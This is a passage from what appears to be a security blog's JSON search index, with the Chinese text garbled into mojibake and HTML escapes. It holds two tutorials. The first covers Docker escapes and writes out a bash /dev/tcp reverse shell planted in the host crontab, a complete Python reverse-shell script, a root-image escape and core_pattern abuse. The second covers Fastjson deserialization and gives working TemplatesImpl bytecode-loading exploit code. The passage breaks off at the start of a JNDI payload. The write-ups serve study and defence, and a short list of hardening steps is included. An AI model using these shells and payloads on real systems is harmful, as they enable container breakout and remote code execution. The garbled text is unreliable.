/dev/tcp/xx.xx.xx.xx/7777 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; \u0026gt;\u0026gt; /yuy0ung/etc/crontab è‡³æ­¤æˆåŠŸè·å–å®¿ä¸»æœºæƒé™\nå†…æ ¸æ¼æ´é€ƒé€¸ å°±æ˜¯å®¿ä¸»æœºçš„å†…æ ¸å­˜åœ¨æ¼æ´çš„æƒ…å†µä¸‹çš„ä¸€äº›åˆ©ç”¨ï¼Œç®€å•æ¥è¯´å°±æ˜¯ææƒç±»çš„å†…æ ¸æ¼æ´ä¼šå¾ˆå¯èƒ½å¯¼è‡´å®¹å™¨é€ƒé€¸\nè¿™äº›å†…æ ¸æ¼æ´é€šå¸¸æ˜¯ä¸€äº›CVEï¼Œä»¥CVE-2016-5195ï¼ˆdirty cowï¼‰ä¸ºä¾‹ï¼š\nå’Œæƒé™æå‡æ—¶çš„dirtyåˆ©ç”¨æ–¹æ³•å·®ä¸å¤ªå¤šï¼Œä¹‹æ‰€ä»¥èƒ½å®ç°é€ƒé€¸ï¼Œæ˜¯å› ä¸ºdockerä¸å®¿ä¸»æœºå…±äº«å†…æ ¸ï¼Œå¦‚æœè¦è§¦å‘è¿™ä¸ªæ¼æ´ï¼Œéœ€è¦å®¿ä¸»æœºå­˜åœ¨dirtyCowæ¼æ´çš„å®¿ä¸»æœºï¼Œå…¶ä»–çš„åˆ©ç”¨ç»†èŠ‚ä¸å†èµ˜è¿°ï¼Œå¯ä»¥å‚è€ƒæˆ‘çš„è¿™ç¯‡æ–‡ç« ï¼šlinuxææƒ-å†…æ ¸ææƒ\né™¤äº†è„ç‰›ï¼Œè¿˜æœ‰å¾ˆå¤šå†…æ ¸æ¼æ´å¯¼è‡´çš„é€ƒé€¸ï¼Œè¿™é‡Œåˆ—ä¸¾ä¸€äº›å°±ä¸ç»†è®²äº†ï¼š\nCVE-2019-16884 CVE-2021-3493 CVE-2021-22555 CVE-2022-0492 CVE-2022-0847 CVE-2022-23222 dockerç”¨æˆ·ç»„ææƒ è¯¥trickå…¶å®å¯ä»¥å½’ç±»åˆ°liunxææƒé‡Œé¢çš„ï¼Œä¸è¿‡ä¹Ÿæ¶‰åŠåˆ°äº†dockerä»¥åŠé€ƒé€¸æ‰€ä»¥æ”¾åˆ°è¿™é‡Œè®°å½•ï¼š\nåŸºç¡€çŸ¥è¯† Docker è¿è¡Œçš„æ‰€æœ‰å‘½ä»¤éƒ½æ˜¯éœ€è¦ sudo æ¥è¿è¡Œï¼Œé‚£æ˜¯å› ä¸º docker éœ€è¦ root æƒé™æ‰èƒ½è¿è¡Œ\nDocker ç›‘æŠ¤è¿›ç¨‹æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œå®ƒèƒ½è¢«å…è®¸è®¿é—® root ç”¨æˆ·æˆ–è€…æ˜¯åœ¨ docker ç»„é‡Œé¢çš„æ‰€æœ‰ç”¨æˆ·ï¼Œå°±ç›¸å½“äºæ‹¥æœ‰äº†root çš„è®¿é—®æƒé™\nç¯å¢ƒæ­å»º ç”±äºå‰é¢å¤ç°ç‰¹æƒæ¨¡å¼é€ƒé€¸çš„æ—¶å€™ï¼Œæˆ‘ä»¬å·²ç»åˆ›å»ºäº†ä¸€ä¸ªyuy0ungç”¨æˆ·å¹¶åŠ å…¥äº†dockerç»„ï¼Œæ‰€ä»¥åˆ‡æ¢åˆ°è¯¥ç”¨æˆ·å³å¯è¿›è¡Œå¤ç°ï¼š\nä¿¡æ¯æœé›† æŸ¥çœ‹å‘ç°å½“å‰ç”¨æˆ·åœ¨dockerç»„ä¸­ï¼š é‚£ä¹ˆå¯ä»¥å°è¯•dockerç”¨æˆ·ç»„ææƒ\næ¼æ´åˆ©ç”¨ è¿™é‡Œç›´æ¥æ‹‰å–ä¸€ä¸ªé’ˆå¯¹ä¸Šé¢æƒ…å†µçš„ææƒé•œåƒï¼Œå¤§è‡´åŸç†å°±æ˜¯æ‹‰å–é•œåƒæ—¶å°†å®¿ä¸»æœºæ ¹ç›®å½•æŒ‚è½½è¿›dockerï¼Œè€Œdockerå¯åŠ¨åè‡ªåŠ¨æ‰§è¡Œå¯åŠ¨è„šæœ¬chrooté€ƒé€¸å‡ºæ¥äº†ï¼Œè¯¦ç»†å†…å®¹å¯ä»¥å‚è€ƒé•œåƒçš„githubï¼šhttps://github.com/chrisfosterelli/dockerrootplease\ndocker run -v /:/hostOS -it --rm chrisfosterelli/rootplease å¯ä»¥çœ‹åˆ°ç›´æ¥å°±æå‡åˆ°rootæƒé™äº†ï¼Œå…¶å®å’Œå‰é¢çš„chrooté€ƒé€¸å·®ä¸å¤š\né’ˆå¯¹dockeré€ƒé€¸çš„é˜²å¾¡æªæ–½ é’ˆå¯¹ä¸Šé¢æåˆ°çš„æ‰‹æ®µï¼Œå¯ä»¥æœ‰å¦‚ä¸‹é˜²å¾¡æªæ–½ï¼š\nå³æ—¶æ›´æ–°docker dockerä½¿ç”¨capabilitiesæ—¶éœ€è¦éµå¾ªæœ€å°ç‰¹æƒåŸåˆ™ å°½é‡åœ¨å¯åŠ¨å®¹å™¨æ—¶ä½¿ç”¨\u0026ndash;useré€‰é¡¹æŒ‡å®šå®¹å™¨ä»¥éç‰¹æƒç”¨æˆ·èº«ä»½è¿è¡Œ ä¸è¦ç›´æ¥æŒ‚è½½ä¸»æœºæ–‡ä»¶ï¼Œå°½é‡ä½¿ç”¨æ•°æ®å·æˆ–å…±äº«æ–‡ä»¶ç³»ç»Ÿ å°†å®¹å™¨ä¸­çš„rootç”¨æˆ·æ˜ å°„ä¸ºå®¿ä¸»æœºä¸­çš„æ™®é€šç”¨æˆ· ä¸è¦åœ¨å®¹å™¨ä¸­æŒ‚è½½docker socketï¼Œä¹Ÿä¸è¦å°†docker apié…ç½®åˆ°å…¬ç½‘ å‚è€ƒé“¾æ¥ï¼šhttps://wiki.teamssix.com/CloudNative/\n",
        "summary": "Dockeré€ƒé€¸æ‰‹æ³•å¤§å…¨ Dockerç›¸å…³å®‰å…¨é£é™©æ›´å¤šé›†ä¸­åœ¨Dockeré€ƒé€¸æ–¹é¢\nå’ŒåŸºç¡€çš„åæ¸—é€æ€è·¯ä¸€æ ·ï¼Œåœ¨è·å–dockerçš„æƒé™åéœ€è¦å¯¹dockerè¿›è¡Œä¿¡æ¯æœé›†ï¼Œåˆ¤æ–­æ˜¯å¦å…·æœ‰æ»¡è¶³dockeré€ƒé€¸çš„æ¡ä»¶\nåˆ¤æ–­æ˜¯å¦ä¸ºå®¹å™¨ç¯å¢ƒ åœ¨ä¹‹å‰çš„æ–‡ç« ä¸­ä¹Ÿæåˆ°è¿‡ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹cgroupä¿¡æ¯ç­‰æ–¹æ³•æ¥åˆ¤æ–­ï¼Œå¯ä»¥å‚è€ƒæˆ‘çš„è¿™ç¯‡ç¬”è®°ï¼šå¿«é€Ÿè¯†åˆ«è™šæ‹Ÿä¸»æœºã€Dockerå’ŒK8sé›†ç¾¤ç¯å¢ƒ\nä¸è¿‡æŸ¥çœ‹cgroupç›®å½•çš„æ–¹æ³•ä¼¼ä¹åªå¯¹cgroup v1æœ‰ç”¨ï¼Œæ‰€ä»¥æ¨èä½¿ç”¨æŸ¥çœ‹æ ¹ç›®å½•.dockerenvçš„åŠæ³•ï¼š\nls -al /.dockerenv ç¡®è®¤ä¸ºå®¹å™¨ç¯å¢ƒä¹‹åï¼Œå°±å¯ä»¥æŸ¥çœ‹æ˜¯å¦å…·æœ‰æ»¡è¶³é€ƒé€¸çš„æ¡ä»¶äº†ï¼Œæ¥ä¸‹æ¥ä»åŸºç¡€æ¦‚å¿µã€ç¯å¢ƒæ­å»ºã€ä¿¡æ¯æœé›†ã€æ¼æ´åˆ©ç”¨ç­‰æ–¹é¢è®°å½•ä¸€ä¸‹dockeré€ƒé€¸çš„ä¸€äº›tricksï¼Œå½“ç„¶å¦‚æœæ¯”è¾ƒæ‡’ï¼Œä¹Ÿå¯ä»¥è¯•è¯•å¼€æºçš„è‡ªåŠ¨æ£€æµ‹è„šæœ¬ï¼šé¡¹ç›®åœ°å€ï¼šhttps://github.com/teamssix/container-escape-check\næŒ‚è½½å®¿ä¸»æœºprocfsé€ƒé€¸ åŸºç¡€æ¦‚å¿µ procfsï¼ˆ/procï¼‰æ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œåæ˜ äº†ç³»ç»Ÿå†…è¿›ç¨‹ä»¥åŠå…¶ä»–ç»„ä»¶çš„çŠ¶æ€ï¼Œå…¶ä¸­æœ‰å¾ˆå¤šæ•æ„Ÿæ–‡ä»¶\nuser namespaceæ˜¯linuxçš„ä¸€é¡¹å®‰å…¨åŠŸèƒ½ï¼Œå…è®¸åœ¨å®¹å™¨ä¸­æ˜ å°„å’Œéš”ç¦»ç”¨æˆ·ID\nè€Œåœ¨å®¹å™¨å†…é»˜è®¤å¯ç”¨rootæƒé™ï¼Œä¸”é»˜è®¤æ²¡æœ‰å¼€å¯User Namespaceæ—¶ï¼Œå®¹å™¨ä¸­çš„rootç”¨æˆ·ä¸å®¿ä¸»æœºçš„rootç”¨æˆ·UIDä¼šä¸€è‡´ï¼ˆå‡ä¸º0ï¼‰ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœå°†procfsæŒ‚è½½åˆ°ä¸å—æ§çš„å®¹å™¨ä¸­ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´å®¹å™¨é€ƒé€¸ï¼Œè¿™é‡Œè¿ç”¨åˆ°ä¸€ä¸ªtricksï¼š\nä» 2.6.19 å†…æ ¸ç‰ˆæœ¬å¼€å§‹ï¼ŒLinux æ”¯æŒåœ¨ /proc/sys/kernel/core_pattern ä¸­ä½¿ç”¨æ–°è¯­æ³•ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸­çš„é¦–ä¸ªå­—ç¬¦æ˜¯ç®¡é“ç¬¦ | ï¼Œé‚£ä¹ˆè¯¥è¡Œçš„å‰©ä½™å†…å®¹å°†è¢«å½“ä½œç”¨æˆ·ç©ºé—´ç¨‹åºæˆ–è„šæœ¬è§£é‡Šå¹¶æ‰§è¡Œ\nç¯å¢ƒæ­å»º åˆ›å»ºå®¹å™¨å¹¶æŒ‚è½½/procç›®å½•ï¼š\ndocker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu æ­å»ºå®Œæ¯•\nä¿¡æ¯æœé›† å¦‚æœå‘ç°äº†ä¸¤ä¸ªcore_patternæ–‡ä»¶ï¼Œåˆ™å¯èƒ½å°±æ˜¯æŒ‚è½½äº†å®¿ä¸»æœºçš„procfsï¼š\nfind / -name core_pattern æ¼æ´åˆ©ç”¨ æ‰¾åˆ°å½“å‰å®¹å™¨åœ¨ä¸»æœºä¸‹çš„ç»å¯¹è·¯å¾„ï¼š\ncat /proc/mounts | xargs -d \u0026#39;,\u0026#39; -n 1 | grep workdir å¯ä»¥çœ‹åˆ°ç»å¯¹è·¯å¾„ä¸º/var/lib/docker/overlay2/8c1a0695756000c2afc1ba95bf605dda88027b937c937e8f2527b597447f37ac/work\næ¥ä¸‹æ¥å®‰è£…vimå’Œgccï¼š\napt-get update -y \u0026amp;\u0026amp; apt-get install vim gcc -y ç„¶ååˆ›å»ºä¸€ä¸ªpythonè„šæœ¬ç”¨äºåå¼¹shellï¼š\n#!/usr/bin/python3 import os import pty import socket lhost = \u0026#34;xx.xx.xx.xx\u0026#34; lport = 7777 def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(\u0026#34;HISTFILE\u0026#34;, \u0026#39;/dev/null\u0026#39;) pty.spawn(\u0026#34;/bin/bash\u0026#34;) # os.remove(\u0026#39;/tmp/.shell.py\u0026#39;) s.close() if __name__ == \u0026#34;__main__\u0026#34;: main() èµ‹äºˆæ‰§è¡Œæƒé™ï¼š\n"
    }
,
    {
        "title": "Fastjsonååºåˆ—åŒ–æ¼æ´",
        "link": "/My-Knowlege-Database/blog/java%E5%AE%89%E5%85%A8/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/",
        "content": "Fastjsonååºåˆ—åŒ–æ¼æ´ fastjsonç®—æ˜¯å›½å†…ç”¨çš„æ¯”è¾ƒå¤šçš„ä¸€ä¸ªç»„ä»¶äº†ï¼Œå®ƒçš„ååºåˆ—åŒ–æ¼æ´ä¹Ÿæ˜¯ç»å…¸ä¸­çš„ç»å…¸\nFastjsonåŸºç¡€ ç®€å•ä½¿ç”¨ Fastjson æ˜¯é˜¿é‡Œå¼€æºçš„ Java JSON åº“ï¼Œå·ç§°â€œJava æœ€å¿« JSON è§£æ/ç”Ÿæˆå™¨â€ï¼Œä½œç”¨å°±æ˜¯ æŠŠ Java å¯¹è±¡ â†” JSON å­—ç¬¦ä¸² äº’ç›¸è½¬æ¢ï¼Œè®©ç½‘ç»œä¼ è¾“ã€æŒä¹…åŒ–ã€å‰åç«¯äº¤äº’æ›´ç®€å•ï¼Œè¿™ä¸ªè½¬æ¢è¿‡ç¨‹ä¹Ÿå°±ç›¸å½“äºæˆ‘ä»¬å¸¸è¯´çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–äº†\næˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªdemoçœ‹çœ‹ï¼Œé¦–å…ˆæ·»åŠ ä¾èµ–ï¼š\n\u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.50\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; æ¥ä¸‹æ¥æ˜¯demoä»£ç ï¼Œå…¶ä¸­ç»™å‡ºäº†ä¸€ä¸ªjavaå¯¹è±¡ï¼Œä¸€ä¸ªjsonå­—ç¬¦ä¸²ï¼Œç„¶åå°†ä»–ä»¬ç”¨fastjsonçš„ç»„ä»¶æ¥è½¬æ¢ï¼š\npackage com.yuy0ung; import com.alibaba.fastjson.JSON; public class FastJsonDemo { public static void main(String[] args) { // å°†ä¸€ä¸ª Java å¯¹è±¡åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸² Person person = new Person(\u0026#34;Yuy1ung\u0026#34;, 18); String jsonString = JSON.toJSONString(person); System.out.println(jsonString); // å°†ä¸€ä¸ª JSON å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸º Java å¯¹è±¡ String jsonString2 = \u0026#34;{\\\u0026#34;age\\\u0026#34;:20,\\\u0026#34;name\\\u0026#34;:\\\u0026#34;Yuy0ung\\\u0026#34;}\u0026#34;; Person person2 = JSON.parseObject(jsonString2, Person.class); System.out.println(person2.getName() + \u0026#34;, \u0026#34; + person2.getAge()); } // å®šä¹‰ä¸€ä¸ªç®€å•çš„ Java ç±» public static class Person { private String name; private int age; public Person(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public int getAge() { return age; } } } è¿è¡Œåå¯ä»¥çœ‹åˆ°Java å¯¹è±¡åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸²ï¼ŒJSON å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸º Java å¯¹è±¡ï¼š\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä½¿ç”¨JSON.toJSONString()å’ŒJSON.parseObject()å°±å®Œæˆäº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œéå¸¸æ–¹ä¾¿\nä¸€äº›ç‰¹æ€§ å­—æ®µæ˜ å°„å…³ç³» åœ¨ä½¿ç”¨fastjsonæ—¶ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå°†JSONå­—ç¬¦ä¸²å’ŒJavaå¯¹è±¡ä¹‹é—´å»ºç«‹æ˜ å°„å…³ç³»ï¼Œå¯ä»¥é€šè¿‡ç±»çš„å±æ€§å’ŒJSONå­—æ®µåè¿›è¡Œæ˜ å°„ã€‚åœ¨æˆ‘ä»¬ä¸Šé¢çš„ä»£ç ä¸­ï¼ŒJavaç±»çš„å±æ€§åå’ŒJSONå­—æ®µåæ˜¯ç›¸åŒçš„ï¼Œå› æ­¤å¯ä»¥ç›´æ¥ä½¿ç”¨Person.classæ¥è¿›è¡Œæ˜ å°„\nå¦‚æœä¸åŒï¼Œå¯ä»¥ä½¿ç”¨@JSONFieldæ³¨è§£æ¥æŒ‡å®šJavaç±»çš„å±æ€§å’ŒJSONå­—æ®µä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼š\npackage com.yuy0ung; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.annotation.JSONField; public class FastJsonDemo { public static void main(String[] args) { // å°†ä¸€ä¸ª Java å¯¹è±¡åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸² Person person = new Person(\u0026#34;Yuy1ung\u0026#34;, 18); String jsonString = JSON.toJSONString(person); System.out.println(jsonString); // å°†ä¸€ä¸ª JSON å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸º Java å¯¹è±¡ String jsonString2 = \u0026#34;{\\\u0026#34;user_age\\\u0026#34;:20,\\\u0026#34;user_name\\\u0026#34;:\\\u0026#34;Yuy0ung\\\u0026#34;}\u0026#34;; Person person2 = JSON.parseObject(jsonString2, Person.class); System.out.println(person2.getName() + \u0026#34;, \u0026#34; + person2.getAge()); } // å®šä¹‰ä¸€ä¸ªç®€å•çš„ Java ç±» public static class Person { @JSONField(name = \u0026#34;user_name\u0026#34;) private String name; @JSONField(name = \u0026#34;user_age\u0026#34;) private int age; public Person(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public int getAge() { return age; } } } è¿™æ ·å°±å¯ä»¥å®ç°javaç±»å±æ€§ä¸jsonå­—æ®µçš„å¯¹åº”ï¼š\nå­—æ®µé¡ºåº é»˜è®¤æƒ…å†µä¸‹ï¼Œç”Ÿæˆçš„JSONå­—ç¬¦ä¸²çš„é¡ºåºæ˜¯æŒ‰ç…§å±æ€§çš„å­—æ¯é¡ºåºè¿›è¡Œæ’åºçš„ï¼Œè€Œä¸æ˜¯æŒ‰ç…§å±æ€§åœ¨ç±»ä¸­çš„å£°æ˜é¡ºåº\nå¦‚æœæˆ‘ä»¬å¸Œæœ›æŒ‰ç…§å±æ€§åœ¨ç±»ä¸­çš„å£°æ˜é¡ºåºæ¥ç”ŸæˆJSONå­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡åœ¨ç±»ä¸­ä½¿ç”¨@JSONType(orders = {\u0026quot;name\u0026quot;, \u0026quot;age\u0026quot;})æ³¨è§£æ¥è®¾ç½®å±æ€§çš„åºåˆ—åŒ–é¡ºåºï¼š\npackage com.yuy0ung; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.annotation.JSONField; import com.alibaba.fastjson.annotation.JSONType; public class FastJsonDemo { public static void main(String[] args) { // å°†ä¸€ä¸ª Java å¯¹è±¡åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸² Person person = new Person(\u0026#34;Yuy1ung\u0026#34;, 18); String jsonString = JSON.toJSONString(person); System.out.println(jsonString); // å°†ä¸€ä¸ª JSON å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸º Java å¯¹è±¡ String jsonString2 = \u0026#34;{\\\u0026#34;user_age\\\u0026#34;:20,\\\u0026#34;user_name\\\u0026#34;:\\\u0026#34;Yuy0ung\\\u0026#34;}\u0026#34;; Person person2 = JSON.parseObject(jsonString2, Person.class); System.out.println(person2.getName() + \u0026#34;, \u0026#34; + person2.getAge()); } // å®šä¹‰ä¸€ä¸ªç®€å•çš„ Java ç±» @JSONType(orders = {\u0026#34;user_name\u0026#34;, \u0026#34;user_age\u0026#34;}) public static class Person { @JSONField(name = \u0026#34;user_name\u0026#34;) private String name; @JSONField(name = \u0026#34;user_age\u0026#34;) private int age; public Person(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public int getAge() { return age; } } } è¿™æ ·å°±å¯ä»¥ä¿®æ”¹ç”Ÿæˆçš„jsonå­—æ®µé¡ºåºï¼š\nç±»å‹æ³¨è§£@type @typeæ˜¯fastjsonä¸­çš„ä¸€ä¸ªç‰¹æ®Šæ³¨è§£ï¼Œç”¨äºæ ‡è¯†JSONå­—ç¬¦ä¸²ä¸­çš„æŸä¸ªå±æ€§æ˜¯ä¸€ä¸ªJavaå¯¹è±¡çš„ç±»å‹ã€‚å…·ä½“æ¥è¯´ï¼Œå½“fastjsonä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºJavaå¯¹è±¡æ—¶ï¼Œå¦‚æœJSONå­—ç¬¦ä¸²ä¸­åŒ…å«@typeå±æ€§ï¼Œfastjsonä¼šæ ¹æ®è¯¥å±æ€§çš„å€¼æ¥ç¡®å®šååºåˆ—åŒ–åçš„Javaå¯¹è±¡çš„ç±»å‹ï¼Œæ¯”å¦‚è¿™ä¸ªdemoï¼ˆéœ€è¦æ³¨æ„çš„æ˜¯ï¼šç”±äºfastjsonåœ¨1.2.24ä¹‹åé»˜è®¤ç¦ç”¨AutoTypeï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬é€šè¿‡ParserConfig.getGlobalInstance().addAccept(\u0026quot;java.lang\u0026quot;);æ¥å¼€å¯ï¼Œå¦åˆ™ä¼šæŠ¥é”™autoType is not supportï¼‰ï¼š\npackage com.yuy0ung; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.ParserConfig; import java.io.IOException; public class FastJsonCalc { public static void main(String[] args) throws IOException { String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Runtime\\\u0026#34;}\u0026#34;; ParserConfig.getGlobalInstance().addAccept(\u0026#34;java.lang\u0026#34;); Runtime runtime = (Runtime) JSON.parseObject(json, Object.class); runtime.exec(\u0026#34;open -a calculator\u0026#34;); } } å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„@typeå­—æ®µæŒ‡å®šäº†ååºåˆ—åŒ–ç»“æœä¸ºjava.lang.Runtime ç±»çš„å®ä¾‹ï¼Œæ‰€ä»¥å¯ä»¥è°ƒç”¨ååºåˆ—åŒ–ç”Ÿæˆçš„Runtimeå¯¹è±¡è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼š\nå†çœ‹ä¸€ä¸ªdemoï¼š\né¦–å…ˆåˆ›å»ºä¸€ä¸ªPersonç±»ï¼š\npackage com.yuy0ung; public class Person { private String name; private int age; public Person() {} @Override public String toString() { return \u0026#34;Person{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#39;}\u0026#39;; } public Person(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } } ç„¶åä¸€ä¸ªFastJsonTestç±»ï¼š\npackage com.yuy0ung; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.serializer.SerializerFeature; public class FastJsonTest { public static void main(String[] args) { Person user = new Person(); user.setAge(20); user.setName(\u0026#34;Yuy0ung\u0026#34;); String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName); System.out.println(s1); } } è¿è¡ŒæŸ¥çœ‹ç»“æœï¼š\næˆ‘ä»¬å‘ç°æ­¤æ—¶ç”Ÿæˆçš„jsonè‡ªå¸¦@typeå­—æ®µäº†ï¼Œå…¶å®å°±æ˜¯åœ¨è°ƒç”¨toJSONStringæ–¹æ³•çš„æ—¶å€™ï¼Œå‚æ•°é‡Œé¢å¤šäº†ä¸€ä¸ªSerializerFeature.WriteClassNameæ–¹æ³•ã€‚ä¼ å…¥SerializerFeature.WriteClassNameå¯ä»¥ä½¿å¾—Fastjsonæ”¯æŒè‡ªçœï¼Œå¼€å¯è‡ªçœååºåˆ—åŒ–æˆJSONçš„æ•°æ®å°±ä¼šå¤šä¸€ä¸ª@typeï¼Œè¿™ä¸ªæ˜¯ä»£è¡¨å¯¹è±¡ç±»å‹çš„JSONæ–‡æœ¬\nFastJsonçš„æ¼æ´å°±æ˜¯è¿™ä¸ª@typeåŠŸèƒ½å»äº§ç”Ÿçš„ï¼Œåœ¨å¯¹è¯¥JSONæ•°æ®è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šå»è°ƒç”¨æŒ‡å®šç±»ä¸­å¯¹äºçš„get/set/isæ–¹æ³•ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥è¯¦ç»†åˆ†æ\nFastjsonæ¼æ´ fastjson\u0026lt;=1.2.24 ååºåˆ—åŒ–æ¼æ´ TesmplatesImplåŠ¨æ€åŠ è½½å­—èŠ‚ç  ä½¿ç”¨Fastjson1.2.23ä¾èµ–ï¼Œæ„å»ºå¦‚ä¸‹ä»£ç ï¼ˆæˆ‘è¿™é‡Œå’Œå…ˆå‰çš„CCé“¾ä¸€æ ·ï¼Œä½¿ç”¨javassistæ¥è·å¾—å­—èŠ‚ç ï¼‰ï¼š\npackage com.yuy0ung.fastjson1_2_24; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; import com.alibaba.fastjson.serializer.SerializerFeature; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import java.util.Base64; public class FastJson1_2_23 { public static void main(String[] args) throws Exception { byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode(); String payload = serialize(code); // ç›´æ¥ä¼ å­—èŠ‚ç  deserialize(payload); } //å› ä¸ºåºåˆ—åŒ–ä¹Ÿä¼šè§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œæˆ‘è¿™é‡Œç›´æ¥æ‹¼æ¥ public static String serialize(byte[] code) { String b64 = Base64.getEncoder().encodeToString(code); String payload = \u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;\u0026#34; + b64 + \u0026#34;\\\u0026#34;],\\n\u0026#34; + \u0026#34; \\\u0026#34;_name\\\u0026#34;:\\\u0026#34;HelloTemplatesImpl\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;_tfactory\\\u0026#34;:{ \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\\\u0026#34; },\\n\u0026#34; + \u0026#34; \\\u0026#34;_outputProperties\\\u0026#34;:{}\\n\u0026#34; + \u0026#34;}\u0026#34;; System.out.println(payload); return payload; } public static void deserialize(String json) throws Exception { ParserConfig parserConfig = new ParserConfig(); Object obj = JSON.parseObject(json, Object.class, parserConfig, Feature.SupportNonPublicField); } } è¿è¡Œåï¼Œå¯ä»¥çœ‹è§ç”Ÿæˆçš„payloadï¼Œä»¥åŠpayloadååºåˆ—åŒ–åæˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼š\nè€Œæˆ‘ä»¬åˆ†æè¿™ä¸ªpayloadå°±çŸ¥é“è¿™é‡Œå®é™…ä¸Šå°±æ˜¯æˆ‘ä»¬å­¦è¿‡çš„TemplatesImlpåŠ¨æ€åŠ è½½å­—èŠ‚ç \nå³æ„é€ ä¸€ä¸ªTemplatesImplç±»çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå…¶ä¸­_bytecodesæ˜¯æˆ‘ä»¬æ„é€ çš„æ¶æ„ç±»çš„ç±»å­—èŠ‚ç ï¼Œè¿™ä¸ªç±»çš„çˆ¶ç±»æ˜¯AbstractTransletï¼Œæœ€ç»ˆè¿™ä¸ªç±»ä¼šè¢«åŠ è½½å¹¶ä½¿ç”¨newInstance()å®ä¾‹åŒ–ã€‚åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œç”±äºgetteræ–¹æ³•getOutputProperties()æ»¡è¶³æ¡ä»¶ï¼Œå°†ä¼šè¢«fastjsonè°ƒç”¨ï¼Œè€Œæ¼æ´åˆ©ç”¨çš„é™åˆ¶æ¡ä»¶ä¹Ÿå¾ˆæ˜æ˜¾ï¼šéœ€è¦ä»£ç ä¸­åŠ äº†Feature.SupportNonPublicFieldï¼Œå³å…è®¸å‘å¯¹è±¡çš„épublicå±æ€§èµ‹å€¼\nJdbcRowSetImplæ‰“JNDIæ³¨å…¥ è¿™é‡Œæˆ‘ä»¬ä¼šæ¥è§¦åˆ°ä¸€ä¸ªæ–°çš„ç±»ï¼šcom.sun.rowset.JdbcRowSetImpl\næˆ‘ä»¬å…ˆçœ‹çœ‹è¿™ä¸ªdemoï¼š\npackage com.yuy0ung.fastjson1_2_24; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class FastJsonJdbcRowSetImpl { public static void main(String[] args) throws Exception { String payload = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\u0026#34; + 